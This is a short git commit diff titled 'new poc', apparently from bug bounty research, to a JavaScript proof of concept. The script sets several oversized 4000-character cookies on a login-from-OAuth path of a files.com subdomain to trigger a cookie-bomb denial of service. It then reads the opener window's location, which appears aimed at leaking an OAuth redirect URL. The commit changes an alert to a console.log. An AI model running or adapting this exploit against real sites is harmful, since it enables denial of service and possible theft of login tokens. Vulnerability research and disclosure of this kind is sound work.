0d9914d6dd958fa7a854392b9c8652a15689e804
Magn4 <tahatoo25@gmail.com>
2025-12-28 18:40:37 +0100

    new poc

--- JS/files.js
+++ JS/files.js
@@ -2,4 +2,4 @@ for (let i = 1; i < 4; i++)
   document.cookie = `DoS_POC${i > 1 ? i : ""}=${"w".repeat(4000)};Path=/login_from_oauth;Domain=bugbountymagn4.files.com`;
 // wait 10 seconds
 await new Promise(resolve => setTimeout(resolve, 10000));
-alert(window.opener.location.href);
+console.log(window.opener.location.href);
